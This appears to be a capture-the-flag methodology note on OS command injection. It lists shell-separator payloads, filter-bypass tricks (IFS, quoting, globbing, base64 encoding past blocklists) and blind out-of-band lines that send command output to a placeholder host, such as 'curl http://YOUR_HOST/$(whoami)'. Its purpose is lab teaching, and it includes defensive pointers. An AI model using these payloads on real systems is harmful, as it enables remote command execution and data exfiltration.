---
id: command-injection
category: WEB
tags: [command-injection, os-command, rce, shell, blind, oob, filter-bypass, ifs, ping, metacaracter, wrong-representation, base64-filter]
tools: []
manuals: []
title: "Command injection (OS command → RCE)"
difficulty: medium
created: 2026-10-04
updated: 2026-11-06
related: [ssti-template-injection, boot2root-methodology-checklist]
---

## How to recognize this pattern

- A feature that clearly calls a system binary with your input: "ping a host", "nslookup",
  "convert file", "check status", "whois". The input becomes a shell argument.
- A numeric/hostname input that, with a trailing `;id`, changes the response.

## Method

### 1. Separators (break out into your command)
```
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
127.0.0.1 `id`
127.0.0.1 $(id)
127.0.0.1 %0a id          # newline (url-encoded)
```

### 2. Blind (no reflected output)
```
# time-based: confirms execution
target; sleep 5
# out-of-band: exfiltrate via DNS/HTTP (needs a listener, see NET)
target; curl http://YOUR_HOST/$(whoami)
target; nslookup $(whoami).YOUR_HOST
```

### 3. Read the flag
```
target; cat /flag.txt
target; cat $(ls /)        # if you don't know the name
```

### 4. Filter bypass
```
# space blocked:
cat${IFS}/flag.txt         cat</flag.txt         {cat,/flag.txt}
# word blocked (cat):
c''at /flag*   c\at /flag*   /bin/c?t /flag*   tac/rev/head/nl
# slash/dot blocked: environment variables, globbing (/flag* , /???g.txt)
```

## Gotchas

- With no external callback available, **blind OOB gets expensive**; prefer confirming by time
  (`sleep`) and then reading the flag directly into a field that reflects it (or redirect it to a
  served file). See the listener decision in the checklist.
- `;` may be filtered while `|`/`&&`/`$()`/newline get through; test them all.
- **Filter on the wrong representation.** If the app blocklists metacharacters on the *encoded*
  input (for example the base64 `name` field) and only then decodes and runs it, the filter never
  sees your real payload: the base64 alphabet has none of `;|&`$()`. Encode the injection and it
  passes untouched. Validate the decoded value, not the wire format.
- If the app uses `exec`/`system` with an array (no shell), metacharacters are **not** interpreted;
  then it isn't classic command injection; reconsider (argument injection, SSTI, path traversal).
- Distinguish from **SSTI** (`{{7*7}}`=49) and from **code injection** (language eval); the fix and
  the payload differ.

## Cross-reference

- `ssti-template-injection`: when the input is evaluated as a template, not as a shell command.
- Exfil via callback → NET category (`custom-tcp-service-scripting`).
